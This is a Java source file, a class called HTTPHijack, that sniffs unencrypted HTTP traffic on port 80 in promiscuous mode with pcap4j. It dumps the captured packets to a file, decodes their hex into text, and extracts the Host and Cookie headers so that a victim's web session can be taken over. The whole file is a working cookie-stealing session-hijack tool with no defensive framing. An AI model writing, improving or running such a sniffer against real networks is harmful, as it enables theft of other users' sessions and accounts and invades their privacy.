import java.io.*;

import org.pcap4j.core.*;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.concurrent.TimeoutException;

public class HTTPHijack {

    static void OpenFile(String name) {
        try {
            File myObj = new File(name);
            if (myObj.createNewFile()) {
                System.err.println("File created: " + myObj.getName());
            } else {
                System.err.println("File already exists.");
            }
        } catch (IOException e) {
            System.out.println("An error occurred.");
            e.printStackTrace();
        }

    }
    static void WritePackets(String target, int time){
        InetAddress addr = null;
        try {
            addr = InetAddress.getByName(target);
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        PcapNetworkInterface nif = null;
        try {
            nif = Pcaps.getDevByAddress(addr);
        } catch (PcapNativeException | NullPointerException e) {
            e.printStackTrace();
        }

        int snapLen = 65536;
        PcapNetworkInterface.PromiscuousMode mode = PcapNetworkInterface.PromiscuousMode.PROMISCUOUS;
        int timeout = time*1000;
        String filter = "tcp port 80";
        PcapHandle handle = null;
        FileWriter packetWriter = null;
        try {
            packetWriter = new FileWriter("PacketsOutput.txt");
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            assert nif != null;
            handle = nif.openLive(snapLen, mode, timeout);
            handle.setFilter(filter, BpfProgram.BpfCompileMode.OPTIMIZE);
            System.out.println(handle.toString());
        } catch (PcapNativeException | NotOpenException | NullPointerException e) {
            e.printStackTrace();
        }
        try {
            for(int i = 0; i < 64 ; i++) {
                packetWriter.write(String.valueOf(handle.getNextPacketEx()));
            }
        } catch (PcapNativeException | TimeoutException | NotOpenException | NullPointerException | IOException e) {
            e.printStackTrace();
        }
        handle.close();
        try {
            packetWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    static void StripPackets(){
        BufferedReader reader;
        FileWriter dataWriter;
        try {
            dataWriter = new FileWriter("DataOutput.txt");
            reader = new BufferedReader(new FileReader("PacketsOutput.txt"));
            String line = reader.readLine();
            while (line != null) {
                if(!line.isEmpty()) {//offset 2
                    if(line.startsWith("Hex", 2)){
                        StringBuilder builder = new StringBuilder();
                        String hex = line.substring(14);
                        for (int i = 0; i < hex.length(); i = i + 3) {
                            String s = hex.substring(i, i + 2);
                            int n = Integer.valueOf(s, 16);
                            builder.append((char)n);
                        }
                        dataWriter.write(builder.toString());
                    }

                }
                line = reader.readLine();
            }
            reader.close();
            dataWriter.close();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    static String[] StripData(){
        String[] output = new String[2];
        BufferedReader reader;
        try {
            reader = new BufferedReader(new FileReader("DataOutput.txt"));
            String line = reader.readLine();
            while (line != null) {
                if(line.startsWith("Host:")){
                    String host = line.substring(6);
                    output[0] = host;
                    //System.out.println(host);
                }
                if(line.startsWith("Cookie:")){
                    String cookie = line.substring(8);
                    output[1] = cookie;
                    return output;
                }
                line = reader.readLine();
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
        return output;
    }

    public static String[] Hijacker(String target, int timeout){
        OpenFile("DataOutput.txt");
        OpenFile("PacketsOutput.txt");
        WritePackets(target, timeout);
        StripPackets();
        return StripData();
    }
}
